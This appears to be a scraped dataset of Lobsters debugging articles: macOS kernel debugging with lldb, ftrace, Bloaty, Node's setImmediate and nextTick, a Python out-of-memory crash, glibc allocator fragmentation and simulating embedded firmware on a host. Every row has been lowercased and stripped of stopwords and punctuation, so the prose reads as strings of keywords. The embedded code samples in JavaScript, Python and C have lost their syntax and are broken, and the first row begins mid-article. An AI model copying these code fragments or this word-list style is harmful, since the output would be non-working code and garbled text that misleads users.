version macos like yosemite place source code sourcecachexnu setting lldb finally break debugger example set target file release kernel build use xnu lldb macro sierra kdk macholib python module required simple pip install macholib trick use nifty lldb macro copy paste kdk debug script command prompted first set target file kdk kernel triggering nmi waiting debugger halt boot process chose dbhalt flag connect debugee command kdpremote ip ip ip address localhost used nat port forwarding lldb lldb target create warning kernel contains debug script run script debug session command script import pythonkernelpy run discovered debug script session setting set targetloadscriptfromsymbolfile true current executable set lldb command script import pythonkernelpy loading kernel debugging pythonkernelpy lldb version setting set targetprocesspythonospluginpath pythonlldbmacroscoreoperatingsystempy setting set targettraphandlernames hndlallintrs hndlalltraps trapfromkernel hndldoublefault hndlmachinecheck flehprefabt exceptionvectorsbase exceptionvectorstable flehundef flehdataabt flehirq flehdecirq flehfiqgeneric flehdec command script import pythonlldbmacrosxnupy xnu debug macro loaded successfully run showlldbtypesummaries enable type summary lldb kdpremote version darwin kernel version fri nov pst root kernel uuid load address kernel slid memory loaded kernel file target arch instantiating thread completely saved state memory loading kext module warning ca nt find binarydsym comapplekeccorecrypto warning ca nt find binarydsym comapplekecpthread omitted done kernel compiled optimization stepping may behave oddly variable may available process stopped thread name queue stop reason signal sigstop frame kernel debugger message unavailable opt doprnthidepointers olddoprnthidepointers asm hwatomicsub debugmode char lldb voila sourcelevel debugging macos kernel
455,Lobsters,debugging,Debugging,You’re Doing It Wrong,http://manishearth.github.io/blog/2017/04/05/youre-doing-it-wrong/,wrong,case xy problem wontfix user always wrong fault,wrong common refrain issue tracker discussion forum everywhere isolation variant rtfm give nonanswer someone want help bounce back manual doc probably already read helpful useful anyone course one accompany nice explanation right wrong always bad thing especially come programming language general context programming tool library wrong almost always due bad mental model person whilst learning built mental model tool work accurately reflect reality time reflect reality reflect mental model maintainer multiple valid way looking something lead impedance mismatch reading doc error message case wrong case xy problem user problem x think solve solution end asking achieve happens pretty often folk may approaching technology prior experience related thing work differently may think idiom apply wontfix someone done support work past mentioned one thing everyone learns support user always wrong fault pretty good template attitude approach wrong question technology online forum well benefit user ask question attitude benefit technology back used active contributing rust compiler also used hang rust lot often answer newbie question rustbeginners exists hang really actively participate much one thing learned probe deeper people hit confusion first place almost always bad mental model rust rarely first programming language folk learn people approach preconception programming work unique rust happens time someone learns language different paradigm learning c c gcd language learning functional language imperative one statically typed dynamic one many ax programming language differ time assumption made reading line whatever resource used learn language anyway folk often bad mental model able identify model correct saved person potentially getting confused every step future great tiny bit effort however one step better person probe bit try understand caused obtain mental model fix doc never happens course everyone read doc diagnostics case error tool help u nudge user towards right mental model whilst helping fix immediate problem rust long time pretty great diagnostics improvement happening think least part due attitude folk rust always trying figure preempt various confusion see good attitude hope folk rust community approach wrong case like
457,Lobsters,debugging,Debugging,env-diff: Compare expected environment variables to those set in production,https://github.com/jacebrowning/env-diff,envdiff compare expected environment variable set production,overview heroku setup requirement installation usage demo tabletool,unix window metric usage overview envdiff commandline tool generate report compare value environment variable environment default defined various file help find variable absent production required new feature test production value nt shared staging environment variable set longer referenced file tool built heroku mind work infrastructure support running command remotely setup requirement installation install envdiff pip directly source code git clone http githubcomjacebrowningenvdiffgit cd envdiff python setuppy install usage generate sample config file customize file match project sourcefiles contain reference environment variable used project path relative path source file environment environment project run name name environment command command display currently set environment variable generate report show difference environment variable demo input yaml config file running terminal output viewed tabletool
459,Lobsters,debugging,Debugging,"setImmediate() vs nextTick() vs setTimeout(fn,0) – in depth explanation",http://voidcanvas.com/setimmediate-vs-nexttick-vs-settimeout/,setimmediate v nexttick v settimeout depth explanation,know misconception first nexttick trigger callback next tick iteration nodejs event loop work depth explanation event loop structure workflow timer io callback idle prepare pole check close callback nexttickqueue event loop propagates previous section settimeout processnexttick,day back guiding new nodejs developer making asynchronous stuff discussing async apis node j wanted provide reference googled surprisingly majority article internet setimmediate processnexttick containing insufficient misleading information going official document node may really feasible nonadvanced developer hence decided come article know misconception first start describing anything would like clear misconception article covering topic misled yet skip section one common misconception discus right concept later article proof statement false indexjs settimeout function consolelog settimeout setimmediate function consolelog setimmediate run node indexjs statement true running code would given output setimmediate would printed always settimeout however reality output predictable run node indexjs multiple time find multiple order indexjs settimeout function consolelog timeout setimmediate function consolelog setimmediate settimeout function consolelog timeout setimmediate function consolelog setimmediate settimeout function consolelog timeout run node indexjs statement true would produced following output timeout setimmediate timeout setimmediate timeout actual output like following irrespective many time run timeout timeout timeout setimmediate setimmediate nexttick trigger callback next tick iteration actually processnexttick setimmediate named wrongly swap name name match functionality however javascript deprecatechange apis named continued wrong term functionality processnexttick actually way invoke callback immediately callback setimmediate triggered duringnext iteration nodejs event loop work way understand workflow difference three function must understand functioning event loop hope already know event loop handle async callback discus though providing short description event loop want know properly read depth explanation event loop structure workflow rectangular box diagram represent phase event loop iterates starting timer close callback also nexttickqueue middle however part event loop phase queue attached event loop enters particular phase target execute callbackstasks queue little description phase timer handle callback assigned settimeout setinterval given time threshold completed io callback handle callback except one set settimeout setinterval setimmediate also close callback idle prepare used internally pole retrieve new io event make node cool dude check callback setimmediate handled close callback handle close connection callback etc eg socket connection close nexttickqueue hold callback processnexttick part event loop event loop propagates enters timer phase check anything callback timer queue start executing one another till either queue empty maximum allowed callback execution completed timer move io callback phase find queue associated io operation followed similar approach timer task done move next phase idle phase used node internally preparation etc event loop enters poll phase handle event event handled also event loop wait bit poll phase new io event nothing event loop work poll phase waiting sleep mode however script assigned setimmediate event loop end poll phase continue check phase execute scheduled script check try executing anything close callback go back timer next iteration tick nexttickqueue callback assigned processnexttick queued nexttickqueue event loop executes one another another till entire queue drained completing ongoing operation irrespective phase concludes event loop description may try understand three apis mentioned title article first workflow event loop say setimmediate exactly immediate queue containing callback executed every iteration event loop check phase example previous section thing nondeterministic depends performance process cause timer extra work sorting take extra time register however move piece code io callback guarantee callback setimmediate called settimeout irrespective anything else indexjs var f require f fsreadfile myfilepathtxt function settimeout function consolelog settimeout setimmediate function consolelog setimmediate run node indexjs output always setimmediate settimeout settimeout also invokes callback executed till event loop enters timer phase settimeout fn along setimmediate close callback phase guarantee execution settimeout setimmediate accordingly keeping phase diagram event loop mind easily determine whether settimeout fn setimmediate called earliest processnexttick per nodejs documentation nexttickqueue processed current operation completes regardless current phase event loop mean queue executed whenever boundary javascript cc crossed like called task current phase neither mean execution current callback sometime next phase hit
460,Lobsters,debugging,Debugging,Introducing Bloaty McBloatface: a size profiler for binaries,http://blog.reverberate.org/2016/11/07/introducing-bloaty-mcbloatface.html,introducing bloaty mcbloatface size profiler binary,readme github githubcomgooglebloaty help wanted contributing acknowledgment boaty mcboatface,excited announce today opensourcing tool working several month google called bloaty mcbloatface let explore taking space executable binary file tl dr couple example bloaty output look like bloaty bloaty vm size file size debuginfo debugloc debugstr debugranges text debugline debugabbrev strtab rodata ehframe symtab debugaranges gccexcepttable ehframehdr dynsym dynstr relaplt elf header unmapped none total break compile unit source file bloaty bloaty compileunits vm size file size none srcbloatycc srcdwarfcc srcelfcc srcmachocc srcmaincc utilstringprintfcc utilstrutilcc utilrunecc total many example explanation available readme github bloaty available apache license code available github githubcomgooglebloaty quick easy build though require somewhat recent compiler since us extensively bloaty primarily support elf file linux bsd etc support macho file o x interested expanding bloaty capability platform interest using bloaty lot protocol buffer team google evaluate binary size impact change change cause size increase come sectionssymbols grew bloaty diff mode understanding change binary size bloaty bloaty oldbloaty vm size file size growing debugstr debuginfo debugloc text debugranges debugline strtab ehframe rodata symtab debugaranges gccexcepttable ehframehdr dynsym relaplt plt dynstr gotplt gnuversion shrinking unmapped debugabbrev total bloaty give highlevel overview section default commandline switch help dig detail slicing dicing different dimension segment section symbol compile unit even inlines use slicing dicing capability even overall binary size primary concern one thing like bloaty seeing section variable ended global variable show data know actually need writable slap const variable watch move data rodata echo int foo testc gcc c testc bloaty section symbol testo vm size file size data foo elf header symtab shstrtab comment strtab unmapped total echo const int foo testc gcc c testc bloaty section symbol testo vm size file size rodata foo elf header symtab shstrtab comment strtab unmapped total wrote bloaty would use script parse output nm look big symbol would also look output size use l look size file disk always bothered different source information always seemed disagree total never matched reason course tool help understand reason counter part goal bloaty create measurement accurate reliable verifiable bloaty build memory map entire file vm domain file domain total row file domain always exactly match file actual size ask measure symbol bloaty track much file virtual memory space covered symbol report part none part binary referred one symbol bloaty notice count first one way total always correct trust result bloaty also transparently report size various overhead like elfar header otherwise hard see one key idea behind bloaty dual vmfile view binary size talk binary size two distinct related concern much space binary take disk much bandwidth download etc file view much memory binary take load actually run vm view matter affected different thing debug symbol make binary larger take memory runtime get loaded zeroinitialized global variable take ram runtime space binary know zero since bloaty show view take huge binary full debug symbol see runtime memory cost size thing result vague harder interpret help wanted love working bloaty unfortunately time implement everything want add sort thing sound alley would love get pull request working bloaty taught ton linkers loader compiler debugger work know elf people learning bottom stack appeal highly recommend project way learn thing love see added bloaty fleshedout macho support right shell otool commandline program parsing macho directly elfdwarf much faster robust dependency analysis turn disassemble text look pointer data construct pretty complete dependency graph symbol refer symbol useful sort thing find dead symbol symbol reachable program entry point tell much binary size wasting compiling ffunctionsectionsfdatasections wl stripunused help understand particular function stripped thought might prototyped time turn prototype idea robust code lot fun thing explore refining data provider complete learned binary file ton data mine take creativity make good use example take compileunits data provider us dwarf data determine code came source file tricky part compiler often leave debugging info try keep binary size reasonable exaple debugaranges section present give u almost exactly need often present present sometimes incomplete place look debug info supplement give complete result optimization bloaty pretty fast particularly file parser binary hundred megabyte long wait bit result core data structure showing hotspot profile think might lowhanging fruit interested working bloaty please read contributing file info acknowledgment got lot help coworkers google thanks paul pluzhnikov david blaikie answered lot question elfdwarf format thanks teammate gerben stavenga giving solid use offering helpful feedback thanks vincent vanhoucke suggestion name fun twist boaty mcboatface thanks especially google open source team make possible release thing like opensource one great perk working
461,Lobsters,debugging,Debugging,ftrace: trace your kernel functions!,https://jvns.ca/blog/2017/03/19/getting-started-with-ftrace/,ftrace trace kernel function,earliest documentation found quick gooogling ftrace exactly first step ftrace program debugging kernel using ftrace tracecmd tracecmd frontend ftrace getting started tracecmd let trace one function next ftrace trick let trace process line function graph tracing output tracer definition futexwake linux know function trace one last thing event ftrace work function code get changed perftools kernelshark new superpower index ftrace article subscription,hello today going talk debugging tool talked much blog ftrace could exciting new debugging tool better yet ftrace new around since linux kernel earliest documentation found quick gooogling might able use even debugging older system known ftrace exists year gotten around really learning yet supposed run workshop tomorrow talk ftrace today day talk ftrace ftrace linux kernel feature let trace linux kernel function call would want well suppose debugging weird problem gotten point staring source code kernel version wondering exactly going read kernel source code often debugging occasionally example week work program frozen stuck spinning inside kernel looking function called helped u understand better happening kernel system involved case virtual memory system think ftrace bit niche tool definitely le broadly useful harder use strace worth knowing let learn first step ftrace unlike strace perf ftrace program exactly run ftrace mycoolfunction would easy read debugging kernel using ftrace start telling cd syskerneldebugtracing various filesystem manipulation way annoying simple example using ftrace way something like cd syskerneldebugtracing echo function currenttracer echo dopagefault setftracefilter cat trace filesystem interface tracing system put value magic file thing happen seems theoretically possible use really preference luckily team ftrace also thought interface user friendly easiertouse interface called tracecmd tracecmd normal program command line argument use found intro tracecmd lwn tracecmd frontend ftrace getting started tracecmd let trace one function first needed install tracecmd sudo aptget install tracecmd easy enough first ftrace demo decided wanted know kernel handling page fault linux allocates memory often lazily really planning use memory right mean application try actually write memory allocated page fault kernel need give application physical memory use let start tracecmd make trace dopagefault function sudo tracecmd record p function l dopagefault plugin function hit ctrlc stop recording ran second hit ctrlc awesome created file called tracedat let see file sudo tracecmd report function dopagefault function dopagefault function dopagefault function dopagefault function dopagefault function dopagefault function dopagefault function dopagefault function dopagefault function dopagefault function dopagefault neat show process name chrome process id cpu function got traced looking whole report sudo tracecmd report grep chrome see traced second time chrome page fault cool done first ftrace next ftrace trick let trace process okay seeing one function kind boring let say want know everything happening one program use static site generator called hugo kernel hugo hugo pid computer right recorded kernel function sudo tracecmd record help read help sudo tracecmd record p function p record pid sudo tracecmd report printed line output interested see line line lot interesting excerpt look like happens clockgettime system call run neat compatsysclockgettime sysclockgettime clockidtokclock posixclockrealtimeget archcounterread compatputtimespec something related process scheduling cpufreqschedirqwork wakeupprocess trytowakeup rawspinlockirqsave dorawspinlock rawspinlock dorawspinlock waltktimeclock ktimeget archcounterread waltupdatetaskravg exitingtask able see function call pretty cool even quite understand function graph tracing another tracing mode called functiongraph function tracer except instrument entering exiting function output tracer sudo tracecmd record p functiongraph p snipped time futex code futexwake getfutexkey getuserpagesfast u getuserpagesfast u mightsleep u mightsleep u u getfutexkeyrefs unlockpage u pagewaitqueue u wakeupbit u u putpage u see example getfutexkey get called right futexwake really happens source code check definition futexwake linux kernel version save click look like static int futexwake user uaddr unsigned int flag int nrwake bitset struct futexhashbucket hb struct futexq next union futexkey key futexkeyinit int ret wakeq wakeq bitset return einval ret getfutexkey uaddr flag flagsshared key verifyread first function called futexwake really getfutexkey neat reading function trace definitely easier way find reading kernel code nice see long function took know function trace run sudo tracecmd list f get list function trace pretty simple important one last thing event know trace function kernel really cool one class thing trace though event correspond super well function call example might want knowwhen program scheduled cpu might able figure peering function call sure kernel also give event see important thing happen see list event sudo cat syskerneldebugtracingavailableevents looked schedswitch event exactly sure schedswitch something scheduling guess sudo cat syskerneldebugtracingavailableevents sudo tracecmd record e sched schedswitch sudo tracecmd report output look like r r see switching pid kernel event cpu ftrace work ftrace dynamic tracing system mean start ftracing kernel function function code get changed let suppose tracing dopagefault function kernel insert extra instruction assembly function notify tracing system every time function get called reason add extra instruction linux compiles extra nop instruction every function space add tracing code needed awesome mean using ftrace trace kernel affect performance start tracing function trace overhead probably wrong think ftrace work anyway seen post need think quite lot individual kernel function event use ftrace directly cool also lot work brendan gregg linux debugging tool hero repository tool use ftrace give information various thing like io latency perftools repository github tradeoff easier use limited thing brendan gregg thought decided make tool lot thing another tool visualizing output ftrace better kernelshark played much yet look useful install sudo aptget install kernelshark new superpower really happy took time learn little ftrace today like kernel tool work differently different kernel version hope find useful one day index ftrace article finally list bunch ftrace article found many lwn linux weekly news pretty great source writing linux buy subscription
462,Lobsters,debugging,Debugging,The Case of the Mysterious Python Crash,https://benbernardblog.com/the-case-of-the-mysterious-python-crash/,case mysterious python crash,symptom pid vim analyzing global system message systemd oomkiller testing last crawled url google chrome request solution attempt using timeouts one previous post connect timeout read timeout solution attempt using eventlet interesting discussion eventlet eventletmonkeypatch sockettrue eventlettimeout solution attempt using signal python signal discussion solution attempt setting download size limit long large requestsget response contextlibclosing final thought linux core dump gdb debugger lobster python weekly pycoders weekly,almost distributed web crawler running hour discovered weird thing one log file stopped updated hour good sign say least process hung somewhere crashed determined find root cause problem post find able debug python crash linux environment symptom found log file generated one crawler child process stopped updated acme cd homeacmeappdatalogs acme log l l total rwr r acme acme sep rwr r acme acme sep rwr r acme acme sep rwr r acme acme sep rwr r acme acme sep rwr r acme acme sep rwr r acme acme sep rwr r acme acme sep rwr r acme acme sep rwr r acme acme sep rwr r acme acme sep rwr r acme acme sep rwr r acme acme sep rwr r acme acme sep see pid appended end filename process stopped updating log file peeked using vim scrolled end info starting new http connection wwwcareertechzcom debug get robotstxt debug get robotstxt crawlerswebmultiworkerwebcrawler debug url http wwwcareertechzcom crawled crawlerswebstandalonewebcrawler debug crawling url http wwwcareertechzcom info starting new http connection wwwcareertechzcom debug get none log file stopped updated performing http get request wwwcareertechzcom process simply hung crashed let see process still running acme p aux grep acme r grep colorauto indeed python process pid running system clearly died exactly analyzing global system message thought looking global system message log would probably give better idea problem especially since crawler running systemd service could thus expect systemd log relevant information varlogmessages opened using searched pid question saw acme sudo vim varlogmessages sep kernel python invoked oomkiller sep kernel python cpuset sep kernel cpu pid comm python tainted sep kernel page reserved sep kernel pid uid tgid totalvm r nrptes swapents oomscoreadj name sep kernel systemdjournal sep kernel systemdudevd sep kernel auditd sep kernel rsyslogd sep kernel dbusdaemon sep kernel python sep kernel python sep kernel python sep kernel python sep kernel python sep kernel python sep kernel python sep kernel python sep kernel python sep kernel pickup sep kernel memory kill process python score sacrifice child sep kernel killed process python process terminated oomkiller evidenced line oomkiller program responsible automatically killing process whenever system run memory process apparently taking much memory virtual memory seen line killed free memory used much memory testing last crawled url figured maybe last url crawled process culprit namely http wwwcareertechzcom loaded google chrome confirmed floating mind web page actually neverending php error page displaying super huge stack trace thus probably caused crawler consume evergrowing amount memory unless timeout occurred right class crawler used download web page copyright benoit bernard right reserved licensed apache license version license may use file except compliance license may obtain copy license http unless required applicable law agreed writing software distributed license distributed basis without warranty condition kind either express implied see license specific language governing permission limitation license import request corecontracts import contract corehttpexceptions import httperror requestsexceptions import connectionerror requestexception class request represents http request def init self requestsrequests initializes request object contractisnotnone request selfrequests request def get self url kwargs performs get request specified url contractisnotempty url return selfperformrequest selfrequestsget url kwargs def performrequest self call url kwargs try response call url kwargs except connectionerror requestexception e raise httperror unable get content url format url e return response class us request library perform http request validate behavior created small unit test downloads problematic url copyright benoit bernard right reserved licensed apache license version license may use file except compliance license may obtain copy license http unless required applicable law agreed writing software distributed license distributed basis without warranty condition kind either express implied see license specific language governing permission limitation license import unittest corehttpexceptions import httperror corehttprequest import request class requesttests unittesttestcase request request def testgetwithurlthatpointstoaveryhugepage self validates downloading url point large web page eventually aborted selfassertraises httperror selfrequestget http wwwcareertechzcom test timeout second used expecting request time causing exception type httperror raised surprisingly never timed ran memory use python process growing without bound aha clearly identified source problem nt timing solution attempt using timeouts discussed one previous post http library request typically use two form timeout connect timeout maximum number second wait socket initially connect read timeout maximum number second wait socket receive data interruption longer either beginning download per se lead timeout neither form timeout occurred contrary request receiving data server nonstop thus wanted force request time long downloads needed kind global timeout unfortunately found request nt currently feature needed alternative solution attempt using eventlet googling around little bit found interesting discussion global timeouts people first suggested one could use eventlet networking library allows nonblocking io operation python theory could use force http get request time whenever download long changed class follows copyright benoit bernard right reserved licensed apache license version license may use file except compliance license may obtain copy license http unless required applicable law agreed writing software distributed license distributed basis without warranty condition kind either express implied see license specific language governing permission limitation license import eventlet import request corecontracts import contract corehttpexceptions import httperror eventlettimeout import timeout requestsexceptions import connectionerror requestexception class request represents http request timeout parameter timeoutparameter timeout default timeout value second defaulttimeoutinseconds def init self requestsrequests initializes request object contractisnotnone request selfrequests request handling timeouts trivial request handle two type timeouts connect read timeouts former initially connect socket remote address port latter download data socket mean infinitely large document would downloaded loaded memory bad need use eventlet monkeypatches required socket call support global download timeouts eventletmonkeypatch sockettrue def get self url kwargs performs get request specified url contractisnotempty url return selfperformrequest selfrequestsget url kwargs def performrequest self call url kwargs try eventlettimeout kwargsget selftimeoutparameter selfdefaulttimeoutinseconds return call url kwargs except connectionerror requestexception timeout e raise httperror unable get content url format url e return response magic code really calling eventletmonkeypatch sockettrue eventlet replaces socketrelated method python standard library including called request asynchronousready one coupling eventlettimeout seen line wrapped socketrelated code would timeoutable cool paper practice though carefully testing class found side effect example would hang unit test suite crawler exact reason nt clear else could break wondered dropped eventlet desperation solution attempt using signal people also suggested python signal could used problem needed sigalrm signal explained discussion signal used window development platform explained documentation window signal called sigabrt sigfpe sigill sigint sigsegv sigterm sigbreak valueerror raised case realized implementing global timeout request much harder thought solution attempt setting download size limit epiphany sort trying implement global timeout mechanism exactly nt trying abort long downloads instead trying abort large one download web page chunk recalculate total download size new chunk could simply use threshold limit downloads certain size super promising much cleaner avenue explore fortunately found requestsget stream parameter allows download data chunk returned response object itercontent method allows iterate content progressively download contextlibclosing method allows release connection back connection pool request even partially read response data modified class came copyright benoit bernard right reserved licensed apache license version license may use file except compliance license may obtain copy license http unless required applicable law agreed writing software distributed license distributed basis without warranty condition kind either express implied see license specific language governing permission limitation license import corehttpexceptions import request contextlib import closing corecontracts import contract requestsexceptions import requestexception import httperror class request represents http request number byte read get request getchunksize maximum length allowed response get request maxresponselength def init self requestsrequests initializes request object contractisnotnone request selfrequests request def get self url kwargs performs get request specified url contractisnotempty url rawcontent try absolutely need download response chunk get request web page large downloading would take forever potentially cause machine run memory much reliable using kind global download timeout mechanism additionally allows continue support connect read timeouts independently could also instantiated single session object reused throughout whole life request object indeed would increased performance get request based test also radically increase memory footprint might even manifest potential leak debugger obviously good anyway internally requestsget requestshead exactly thing create new session new request selfrequestssession session closing sessionget url streamtrue kwargs response chunk responseitercontent chunksizeselfgetchunksize decodeunicodetrue returned chunk type byte mean itercontent unable detect encoding response order decode happen several situation url point binary file html page url point page whose encoding simply ca nt detected reason url point empty page url point error page eg etc must decode chunk assuming encoding also important note responseencoding may equal none case occurs url point binary document eg pdf rawcontent chunk responseencoding else chunkdecode len rawcontent selfmaxresponselength raise corehttpexceptionshttperror response large greater byte format selfmaxresponselength responseurl responseurl statuscode responsestatuscode header responseheaders except requestexception httperror e catch exception coming request requestexception httperror raise corehttpexceptionshttperror unable get content url format url e except unicodedecodeerror lookuperror e catch exception coming strdecode raise error type unicodedecodeerror example may happen url point binary document eg pdf request raise error type lookuperror ca nt get incremental decoder itercontent encoding invalid eg encoding texthtml raise corehttpexceptionshttperror unable decode content url format url e return rawresponse responseurl statuscode header rawcontent whenever new http get request sent code downloads response chunk check whether total download size exceeded predetermined threshold raise exception type corehttpexceptionshttperror tested code guess cumulative chunk reached total size code successfully aborted download raised exception type corehttpexceptionshttperror expected awesome problem solved final thought post seen resolve specific type python crash determined one crawler process taking way much memory thus causing killed diagnosis rather straightforward thanks availability critical information log quite lucky sense however type crash probably generate linux core dump analyze using gdb debugger never would certainly make super interesting blog post curious know ever debug python crash tool use successful please leave comment comment section update post featured lobster also featured python weekly pycoders weekly newsletter get chance subscribe one wo nt disappointed thanks everyone support great feedback
463,Lobsters,debugging,Debugging,When the memory allocator works against you,https://glandium.org/blog/?p=3698,memory allocator work,mozillacentral gitcinnabar fit address space recent addition several thousand commits file basic memory resource tracking guppy heapy pdb objgraph pympler checkpointrestore userspace debian pythondbg reported python bug tracker brutal way gdbheap dude ram deep dive python us memory slide use instead arena python allocator entirely disabled pympler cinnabar pmo trackback,cloning mozillacentral gitcinnabar requires lot memory actually much memory fit address space optimized memory use first place instance gitcinnabar keep memory hex value byte rather raw value byte wrote initial prototype matter much close ish tipping point require memory time time passed mozillacentral grew suspect recent addition several thousand commits file made thing worse order come plan make thing better short longer term needed data added basic memory resource tracking collected data cloning mozillacentral must admit ready witnessed follow tale frustration plural expecting thing gotten worse master branch used data collection middle refactoring many change suspecting might affected memory usage however expecting see clone command using memory peak usage across process note memory size r minus shared also taking unexpected long time cloned large repository like mozillacentral scratch sure related recent growth size otherwise collected data well le time spent le memory ok definitely something wrong master wait minute slope gitremotehg process actually make kind sense mean understand starting finishing import manifest phase start middle end long finish wth first thing first since r variety thing checked proc pidsmaps confirmed indeed heap point reach google type something like python memory profile find various tool one result remembered used past guppy heapy armed pdb broke execution middle slope tried get memory stats heapy sigsegv ouch let try something else reached objgraph pympler sigsegv ouch tried working around crash long retrospectively hindsight somehow successful avoiding peaking smaller set object whatever despite attached process r able find data adding surely help getting point took close hour time retrospectively wish investigated using something like checkpointrestore userspace anyways decided really wanted try see whole picture smaller peak might missing something resolved look sigsegv getting using pympler collecting core dump happened guess debian pythondbg package contain debug symbol python package core dump useless since expecting fix something python downloaded source built ran command waited finally got backtrace first google hit crashing function exact unfixed crash reported python bug tracker patch crashing code f fbuiltins f ftstate interp builtins f ftstate null classic null deref added guard assessing break anything ran command waited sigsegv facedesk another crash line really use patched python yes time f ftstate interp null sigh player shoot finally still stuck accounted ok know python memory profiling tool entirely reliable let try heapy sigsegv sigh debug info heapy module crash happens sigh rebuild module debug info try backtrace look like heapy recursing lot look rsp compare address space proc pidmaps confirmed stack overflow let ugly thing increase stack size brutal way woohoo heapy tell even le memory used found far like half le yeah right clear got found gdbheap tool red hat david malcolm associated talk dude ram deep dive python us memory slide gdb attached would finally able rip python gut find memory went thought gdbheap tool found much heapy matter could coincidental oh kay remember exactly went mind since attached running process gdb typed following gdb prompt gdb call mallocstats truth finally unvealed memory allocator acting whole time ouput something like arena system byte number close use byte number close yes glibc allocator telling allocated memory holding onto must found really bad allocation pattern cause massive fragmentation one thing david malcolm talk taught though python us allocator small size glibc allocator know roughly adding difference r glibc said holding use byte reported somehow match found far time see thing evolved time entire clone process grabbed new data tracking evolution system byte use byte two thing note data relatively large gap glibc allocator say gotten system r minus shared size expecting corresponds small allocation python handle actual memory use going import manifest phase contrary evolution r suggests fact latter exactly gitcinnabar supposed work read changesets manifest chunk hold onto importing file throw away manifest changesets chunk one one import however extra bookkeeping requires additional memory expected le memory consuming keeping changesets manifest chunk memory point thought possible explanation since python glibc mmap ing arena might intertwined way make thing go well allocation pattern happening import manifest phase fact allocates free increasingly large buffer manifest manifest grow size mozillacentral history put theory work patched python interpreter making use malloc instead mmap arena aha thought definitely look much better le gap glibc say requested system r size importantly runaway increase memory usage middle nowhere preparing write post mixing allocator could unintended consequence comparison point went ahead ran another test python allocator entirely disabled time heh turn glibc acting alone much plausible theory still think mixing allocator unintended consequence note however reason python allocator exists valid without overall clone took almost minute since getting data gathered new data without python allocator master branch paint rather different picture original data branch much le memory use regression one would think fact much difference except spike end got worse noise import manifest phase got bigger implying larger amount temporary memory used latter may contribute allocation pattern throw glibc memory allocator turn tracking memory usage python rather painful tool paint complete picture hear python somewhat better regard hope true moment stuck reliable tool used turn pympler rebuilding python interpreter without allocator asking system allocator allocated data defined problem tackle easy spike end clone le easy working around glibc allocator behavior hunch kind allocation causing runaway increase r coincidentally halfway refactor code dealing manifest help dealing issue subject subsequent post cinnabar pmo response currently closed trackback site
464,Lobsters,debugging,Debugging,Host-based simulation for embedded systems,http://www.jonnor.com/2017/03/host-based-simulation-for-embedded-systems/,hostbased simulation embedded system,fridge thermostat embedded system harder debug case triggering midi capacitive sensor hang capacitivesensor solve problem first understand recording matplotlib exponential moving average filter exponential moving average nice introduction arduino hostbased simulation microflo simulator flowtrace another plotting tool profiling device forget hardware conclusion datadriven testing machine learning technique,embedded system microcontroller program really hard understand technique help embedded system computer system dedicated function within larger mechanical electrical system wikipedia example embedded system include everything fridge thermostat airbag sensor car consumer electronics like electronic keyboard music programming system extra challenging compared writing software generalpurpose computer complicating factor may include limited computing power memory storage bandwidth need low deterministic response time needed soft hard realtime running battery within constrained power budget need high reliability without user intervention long period time month year malfunctioning system may cause material damage harm people problem may require considerable domainspecific knowledge typically need come term mundane practical problem usually hard understand going program embedded system harder debug problem hardtounderstand software system unique embedded happens frequently also developing pc mobile device several aspect typically make problem severe often hard stimulate system input automatically typically physicalexternal nature input output internal state system may change faster human observe realtime environment system typically influence result sometimes unforseen way lowlevel programming language technique still norm target device ui development tool connection system often best slow serial connection make working system pleasant productive found two technique useful recording sensor data device analyzing offline pc running firmware logic pc abstracting away hardware dependency case triggering midi capacitive sensor friend mine building electronic music instrument hanglike thing pad us capacitive touch sensor sends midi note usb triggering sampler synthesizer make sound core component system capacitive sensor connected arduino sending midi message computer software usb firmware device arduino sketch using capacitivesensor library read capacitance pad summing n consecutive sample give basic filtering note triggered value exceedes specified threshold th setup worked principle practice way hitting drumpad seemed impossible find combination n th device would trigger correctly case n high fast tap would droppedignored n low caused occational double triggering th high would trigger single finger tap th low would trigger palm hovering pad make work reliably solve problem first understand several hour spent tweaking value recompiling sketch uploading hitting pad bit listening right thing gave u rough intuition thing worked generally understanding situation quite sparse understandable much one learn observing system realtime outside naked eyeear seemed pad hit influence plausible surface area might influence effective capacitive coupling example pose trigger hitting fingertip finger flat side thumb case trigger hand hovering pad touching casing thumb pad needed understant input data different scenario first added logging arduino sketch sending time reading current sensor value one sensor const long beforeread millis const input input readinputs const long afterread millis serialprint serialprint afterreadbeforeread serialprint serialprint inputvalues capacitance serialprintln stream showed reading sensor took long time unacceptable musical instrument clear value go issue caused would fixed way small python script read serial port writing raw data file allowed u record data whole scenario instance recorded thing like hoveringthentouching using filename description scenario directory group set recording another python script used analysing data parsing raw value using matplotlib plot could finally see going longer period time compare different scenario eachother case illustrated crux problem red area indicate hovering pad palm sensed capacitance value higher touching fingertip threshold set high orange line miss finger tap low yellow false trigger hovering palm better alternative detection algorithm maybe highpass filter detect change edge may possible possible identify case plugging highpass filter python analysis script playing value seemed support run python realtime processing need able implement filter arduino firmware exponential moving average filter exponential moving average ema emwa selected basis filter many desirable property use latencysensitive application microcontroller requires storing one number computationally simple robust variation sampling time jitter unlike fir filter introduces latency apart timeconstant filter nice introduction arduino usage static int exponentialmovingaverage const int value const int previous const float alpha return alpha value previous nexthighfilter exponentialmovingaverage inputcapacitance previoushighfilter appconfighighpass nexthighpassed inputcapacitance nexthighfilter value highpass know work correctly hostbased simulation regular arduino sketch generally run target microcontroller application logic mixed hardwaredependent io library case capacitivesensor midiusb arduino c nothing prevents u separating application logic making hardwareindependent also execute host easiest method put code hpp include sketch hostonly tool include hangdrumhpp let u use regular c tool practice testing validating code without needing access hardware automated unit integrationtesting fuzztesting mutation testing dynamic analysis like valgrind using continious integration service like travis ci project custom hardware let develop part software hardware finalized potentially saving lot time like express entire application logic firmware pure function take input current state return new state formulation let u know exactly may affect system hidden dependency state state calculatestate const state previous const input input const config config state next previous nexttime inputtime unsigned int npads nextpads calculatestatepad previouspads inputvalues configpads config calculatemidimessages next config nextmessages return next input output function plainolddata safely meaningfully serialize deserialize get better visibility internals system help understanding also store intermediate value padstate calculatestatepad const padstate previous const padinput input const padconfig config const config appconfig nextraw inputcapacitance nexthighfilter exponentialmovingaverage inputcapacitance previoushighfilter appconfighighpass nexthighpassed inputcapacitance nexthighfilter nextlowpassed exponentialmovingaverage nexthighpassed previouslowpassed appconfiglowpass nextvalue nextlowpassed used dataflow system like microflo would gotten introspectability free combining recorded input data log platformindependent application logic make simulator firmware std vector hangdrum input inputevents readevents filename std vector hangdrum state state hangdrum state state auto event inputevents state hangdrum calculatestate state event config statespushback state writeflowtrace tracefilename trace store execution used flowtrace jsonbased format tracing 